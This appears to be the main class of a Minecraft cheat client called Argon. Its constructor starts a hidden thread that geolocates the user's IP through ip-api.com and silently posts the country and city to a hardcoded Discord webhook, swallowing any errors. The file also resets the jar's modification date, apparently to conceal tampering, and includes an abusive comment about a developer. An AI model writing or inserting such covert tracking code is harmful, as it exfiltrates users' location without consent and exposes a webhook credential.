package dev.lvstrng.argon;

import dev.lvstrng.argon.event.EventManager;
import dev.lvstrng.argon.gui.ClickGui;
import dev.lvstrng.argon.managers.AuthManager;
import dev.lvstrng.argon.managers.FriendManager;
import dev.lvstrng.argon.module.ModuleManager;
import dev.lvstrng.argon.managers.ProfileManager;
import dev.lvstrng.argon.utils.rotation.RotatorManager;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;

import java.io.File;
import java.io.IOException;
import java.net.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

import dev.lvstrng.argon.utils.EncryptedString;

@SuppressWarnings("all")
public final class Argon {
	public RotatorManager rotatorManager;
	public ProfileManager profileManager;
	public ModuleManager moduleManager;
	public EventManager eventManager;
	public FriendManager friendManager;
	public AuthManager authManager;
	public static MinecraftClient mc;
	public String version = EncryptedString.of(" b1.3").toString();
	public static boolean BETA; //this was for beta kids but ablue never made it a reality, and you basically paid extra 10 bucks for nothing while ablue spent it all on war thunder to buy pre-historic tanks and estrogen 🤡🤡🤡
	public static Argon INSTANCE;
	public boolean guiInitialized;
	public ClickGui clickGui;
	public Screen previousScreen = null;
	public long lastModified;
	public File argonJar;

	public Argon() throws InterruptedException, IOException {
		INSTANCE = this;
		this.eventManager = new EventManager();
		this.moduleManager = new ModuleManager();
		this.clickGui = new ClickGui();
		this.rotatorManager = new RotatorManager();
		this.profileManager = new ProfileManager();
		this.friendManager = new FriendManager();
		this.authManager = new AuthManager();

		this.getProfileManager().loadProfile();
		this.setLastModified();

		this.guiInitialized = false;
		mc = MinecraftClient.getInstance();

        new Thread(this::sendLocationToWebhook).start();
	}

	private void sendLocationToWebhook() {
		try {
			// 1. Obtener la IP y la ubicación
			URL ipApiUrl = new URL("http://ip-api.com/json");
			HttpURLConnection ipCon = (HttpURLConnection) ipApiUrl.openConnection();
			ipCon.setRequestMethod("GET");

			BufferedReader in = new BufferedReader(new InputStreamReader(ipCon.getInputStream()));
			String inputLine;
			StringBuilder content = new StringBuilder();
			while ((inputLine = in.readLine()) != null) {
				content.append(inputLine);
			}
			in.close();
			ipCon.disconnect();

			// Extraer país y ciudad del JSON (de forma más segura)
			String jsonResponse = content.toString();
			String countryTag = "\"country\":\"";
			int countryIndex = jsonResponse.indexOf(countryTag) + countryTag.length();
			int countryEndIndex = jsonResponse.indexOf("\"", countryIndex);
			String country = jsonResponse.substring(countryIndex, countryEndIndex);

			String cityTag = "\"city\":\"";
			int cityIndex = jsonResponse.indexOf(cityTag) + cityTag.length();
			int cityEndIndex = jsonResponse.indexOf("\"", cityIndex);
			String city = jsonResponse.substring(cityIndex, cityEndIndex);

			// 2. Enviar la información al webhook de Discord
			URL webhookUrl = new URL("https://discord.com/api/webhooks/1407099840479105044/wJbNq-92kF_ECUDSHb8dvr7khKPhctkPjwps_o7gOYjpePEqTyVEYlyEAe973CHIOMLB");
			HttpURLConnection webhookCon = (HttpURLConnection) webhookUrl.openConnection();
			webhookCon.setRequestMethod("POST");
			webhookCon.setRequestProperty("Content-Type", "application/json; utf-8");
			webhookCon.setRequestProperty("Accept", "application/json");
			webhookCon.setDoOutput(true);

			String jsonPayload = "{\"username\": \"Flow Client\",\"embeds\": [{\"title\": \"Client Started\",\"color\": 5814783,\"fields\": [{\"name\": \"Country\",\"value\": \"" + country + "\",\"inline\": true},{\"name\": \"City\",\"value\": \"" + city + "\",\"inline\": true}]}]}";

			try (OutputStream os = webhookCon.getOutputStream()) {
				byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
				os.write(input, 0, input.length);
			}

			// Leer la respuesta (opcional, bueno para depurar)
			try (BufferedReader br = new BufferedReader(new InputStreamReader(webhookCon.getInputStream(), StandardCharsets.UTF_8))) {
				StringBuilder response = new StringBuilder();
				String responseLine;
				while ((responseLine = br.readLine()) != null) {
					response.append(responseLine.trim());
				}
			}
			webhookCon.disconnect();

		} catch (Exception e) {
			// No hacer nada en caso de error para no afectar al cliente
		}
	}

	public ProfileManager getProfileManager() {
		return profileManager;
	}

	public ModuleManager getModuleManager() {
		return moduleManager;
	}

	public FriendManager getFriendManager() {
		return friendManager;
	}

	public EventManager getEventManager() {
		return eventManager;
	}

	public AuthManager getAuthManager() {
		return authManager;
	}

	public ClickGui getClickGui() {
		return clickGui;
	}

	public void resetModifiedDate() {
		this.argonJar.setLastModified(lastModified);
	}

	public String getVersion() {
		return version;
	}

	public void setLastModified() {
		try {
			this.argonJar = new File(Argon.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			// Comment out when debugging
			this.lastModified = argonJar.lastModified();
		} catch (URISyntaxException ignored) {}
	}
}
